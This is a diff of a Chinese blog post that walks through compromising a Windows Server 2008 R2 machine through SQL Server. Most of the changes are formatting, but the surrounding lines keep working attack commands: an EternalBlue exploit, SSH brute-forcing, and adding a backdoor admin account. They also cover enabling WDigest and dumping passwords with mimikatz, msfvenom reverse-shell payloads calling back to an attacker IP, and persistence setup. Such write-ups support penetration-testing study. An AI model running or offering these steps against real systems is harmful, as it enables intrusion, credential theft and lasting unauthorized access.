@@ -2,6 +2,9 @@
 tags: [SQL Server, 网络安全]
 title: SQL Server 另类 getshell
 last_modified_at: 2023-5-4
+slug: sql-server-getshell
+redirect_from: 
+  - /posts/SQL_Server另类getshell
 ---
 
 ## 目标环境
@@ -10,7 +13,7 @@ last_modified_at: 2023-5-4
 
 Windows Server 2008 R2，安装了360安全卫士，扫描结果大致如下：
 
-```
+```plaintext
 80/tcp    open  http               Microsoft IIS httpd 7.5
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
@@ -34,7 +37,7 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 445 开着，那直接跑个永恒之蓝试试：
 
-```
+```shell
 use exploit/windows/smb/ms17_010_eternalblue
 set rhost 192.168.1.66
 exploit
@@ -42,10 +45,11 @@ exploit
 
 非常成功的——被拦了。
 
-```
+```plaintext
 [+] 192.168.1.66:445 - The target is vulnerable.
 [-] 192.168.1.66:445 - Errno::ECONNRESET: An existing connection was forcibly closed by the remote host.
 ```
+
 ## SQL Server 部分
 
 ### xp_cmdshell
@@ -150,7 +154,7 @@ CLR技术详细教程：[MSSQL 利用 CLR 技术执行系统命令](https://clou
 
 可能的数个配置文件读取命令：
 
-```
+```shell
 type C:\Windows\System32\config\systemprofile\AppData\Roaming\Oray\SunloginClient\sys_config.ini
 type "C:\Program Files\Oray\SunLogin\SunloginClient\config.ini"
 type C:\ProgramData\Oray\SunloginClient\config.ini
@@ -229,7 +233,7 @@ SQL Server 代理 -> 作业 -> 步骤
 
 然后修复了文件权限（一行一行输）（实际情况可能还有不同，可仿照此部分自行调整）：
 
-```
+```shell
 del C:\ProgramData\ssh\administrators_authorized_keys
 icacls.exe "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant "Administrator:F" （上面这两行貌似没用）
 icacls.exe "C:\Users\Administrator\.ssh\authorized_keys" /inheritance:r /grant "Administrator:F" /remove Administrators /remove SYSTEM
@@ -241,13 +245,13 @@ icacls C:\ProgramData\ssh\ssh_host_rsa_key （这一行只是用于查看的）
 
 接着，用这行命令重启服务：
 
-```
+```shell
 cmd /c "taskkill /f /im sshd.exe & C:\OpenSSH-Win64\sshd.exe"
 ```
 
 然后用Metasploit爆破：
 
-```
+```shell
 use auxiliary/scanner/ssh/ssh_login
 set RHOST 192.168.1.66
 set RPORT 52917
@@ -264,7 +268,7 @@ run
 
 或者你也可以直接先用公钥连接过去，虽然应该没什么用。
 
-```
+```shell
 use auxiliary/scanner/ssh/ssh_login_pubkey
 set RHOST 192.168.1.66
 set RPORT 52917
@@ -316,7 +320,7 @@ int main(){
 
 ### 账户添加
 
-```
+```shell
 net user user password123 /add
 net localgroup administrators user /add
 ```
@@ -325,19 +329,19 @@ net localgroup administrators user /add
 
 先用下面这条保存明文凭据（目标账户重新登录后生效）：
 
-```
+```shell
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 ```
 
 然后就可以用mimikatz窃取了。建议直接在目标系统运行。
 
-```
+```shell
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
 或者用meterpreter：
 
-```
+```shell
 getsystem
 load kiwi
 kiwi_cmd sekurlsa::logonpasswords
@@ -355,7 +359,7 @@ creds_all
 
 或者用mimikatz直接解决，该方式可能需要先开启一个远程桌面连接（[具体说明](https://tools.thehacker.recipes/mimikatz/modules/ts)）：
 
-```
+```shell
 privilege::debug
 ts::mstsc
 ts::logonpassword
@@ -365,7 +369,7 @@ ts::logonpassword
 
 先生成个木马（分别为64位与32位）：
 
-```
+```shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7777 --platform Windows -f exe > s.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7778 -a x86 --platform Windows -f exe > s2.exe
 
@@ -373,7 +377,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7778 -a x8
 
 然后在msfconsole中监听：
 
-```
+```shell
 handler -H 192.168.1.233 -P 7777 -p windows/x64/meterpreter/reverse_tcp
 handler -H 192.168.1.233 -P 7778 -p windows/meterpreter/reverse_tcp
 ```
@@ -384,7 +388,7 @@ handler -H 192.168.1.233 -P 7778 -p windows/meterpreter/reverse_tcp
 
 请注意，一切以`#`开头的内容都应被手动删除。不要把它们输入在命令中。
 
-```
+```shell
 # use exploit/windows/local/persistence_service # 以服务方式安装
 use exploit/windows/local/persistence
 set lhost 192.168.1.233
